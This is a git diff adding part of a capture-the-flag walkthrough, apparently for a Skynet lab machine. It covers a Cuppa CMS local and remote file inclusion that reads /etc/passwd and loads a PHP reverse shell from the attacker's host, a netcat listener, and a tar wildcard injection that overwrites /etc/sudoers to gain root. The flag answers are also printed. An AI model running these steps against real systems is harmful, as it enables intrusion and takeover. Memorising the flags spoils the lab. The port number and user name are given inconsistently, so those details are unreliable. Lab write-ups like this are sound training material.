@@ -111,6 +111,148 @@ and we get access, inside are a lot of notes and files that we don’t necessary
 
 
 
+![1](https://github.com/user-attachments/assets/10723c91-09f1-45da-b8bb-6466e480f5a8)
+
+
+![2](https://github.com/user-attachments/assets/5df13dc7-1319-4750-a499-7cad8f0e30a0)
+
+
+![3](https://github.com/user-attachments/assets/c0577fe6-8820-45f9-bb88-15685aa227b1)
+
+
+<h1>Inside we find the secret directory : </h1>
+
+
+![4](https://github.com/user-attachments/assets/209cccac-9ff3-4679-ae3b-3ef9b1575431)
+
+
+If we go to that directory we find a simple page, let’s run dirb to see if there are more hidden directories:
+
+
+```bash
+dirb http://10.10.167.117/45kra24zxs28v3yd/
+```
+
+We find /administrator if we go there we find that the page is running CuppaCMS, we can search for it on searchsploit:
+
+
+![5](https://github.com/user-attachments/assets/f87d7bb8-cd83-4ea2-8046-3ec2abdc4a8d)
+
+
+
+<h1>sign in : Cuppa CMS </h1>
+
+
+
+![6](https://github.com/user-attachments/assets/74f047e2-ed5a-4f95-a69d-3a31b724ca94)
+
+
+<h1>Exploitation : </h1>
+We open searchsploit and search for the exploit in The CMS
+
+
+![7](https://github.com/user-attachments/assets/3cee3634-600c-44fd-943a-1f2c68e2f076)
+
+
+Reading the text file for the exploit, we see that it is possible to read the Local files on the target machine by targeting the urlConfig parameter in the alertConfigField.php. The best part is that it doesn’t even warrant a login into the CMS.
+
+
+![8](https://github.com/user-attachments/assets/378506b3-04cb-4ea5-bdc8-fcc7656a477b)
+
+
+we can read the /etc/passwd file on the target divice
+
+
+```bash
+http://target/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=.../../../../../../../../../etc/passwd
+```
+
+![9](https://github.com/user-attachments/assets/69672ff5-91fa-416b-8656-a5210845a78c)
+
+
+
+We can get our reverse shell for revshells.com, select PHP PentestMonkey, enter your machine ip and the listening port (in my case I choose 1234), downloaded and put it inside a folder
+Start a http server in the folder where you downloaded your revshell:
+
+
+```bash
+python3 -m http.server
+```
+
+<h1> Start our listener :  </h1>
+
+After executing this on our browser, a reverse shell should be opened on our side
+
+
+```bash
+nc -lvnp 1337
+```
+
+<h1> Request the link : </h1>
+
+
+```bash
+http://skynet/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=http://10.9.224.219/php-reverse-shell.php
+```
+
+Now we get our reverse shell!
+
+We can spawn a shell with python:
+
+
+```bash
+python -c 'import pty;pty.spawn("/bin/bash")'
+```
+
+```txt
+we see that there is a photo user named Melideson. You Have highlighted the user within their home directory .
+```
+
+![10](https://github.com/user-attachments/assets/e81505b9-c1e1-4ca8-ad69-edf27f6fe359)
+
+```
+Answer: 7ce5c2109a40f958099283600a9ae807
+```
+
+Inside /home/milesdyson/backups we find a file backup.sh and see that every minutes a script is being executed, we can perfom a wildcard injection.
+
+
+![11](https://github.com/user-attachments/assets/3d3cc288-5970-4d67-8dff-37ddf1f3767d)
+
+
+We run this commads, inside the folder /var/www/html:
+
+
+![12](https://github.com/user-attachments/assets/0eeed21b-1c68-460e-9025-e9b0004c4982)
+
+
+```bash
+echo 'echo "www-data ALL=(root) NOPASSWD: ALL" > /etc/sudoers' > pavan.sh
+echo "/var/www/html"  > "--checkpoint-action=exec=sh pavan.sh"
+echo "/var/www/html"  > --checkpoint=1
+```
+
+
+![13](https://github.com/user-attachments/assets/aa7b133d-0c71-49c9-8acb-615d174775b2)
+
+
+```bash
+And get the root shell, and then we can find the tag /root/root.txt
+```
+
+
+```
+Answer: 3f0372db24753accc7179a282cd6a949
+```
+
+![14](https://github.com/user-attachments/assets/cf1c459e-fc79-4bb3-93e3-012405016a6a)
+
+
+
+
+
+
+
 
 
 
